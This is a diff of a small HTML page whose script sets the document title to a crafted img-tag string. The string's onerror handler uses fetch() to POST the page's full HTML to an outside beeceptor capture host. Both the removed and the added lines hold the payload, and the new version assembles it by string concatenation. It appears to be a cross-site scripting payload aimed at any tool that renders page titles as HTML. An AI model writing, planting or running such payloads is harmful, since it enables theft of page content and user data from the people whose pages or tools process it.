@@ -1,14 +1,13 @@
-<!DOCTYPE html>
 <html>
 <head>
     <title>old title</title>
 </head>
 <body>
-
 <script>
-    window.addEventListener('load', function() {
-        this.document.title = '<img src = "a", onerror = javascript:"const currentHTML = document.documentElement.outerHTML;fetch("https://yifengze.free.beeceptor.com", {method: "POST",body: currentHTML,headers: {"Content-Type": "text/html"}});"';
-})
+    str2 = '<img src="a", onerror="' + 'fetch(' +"'https://eddie.free.beeceptor.com'" +',' + '{method: '+"'POST'"+', body: document.documentElement.innerHTML,'+' headers: {'+"'Content-Type'"+': '+"'text/html'"+'}});"';
+    this.document.title = str2;
+    console.log(str2)
 </script>
 </body>
+
 </html>
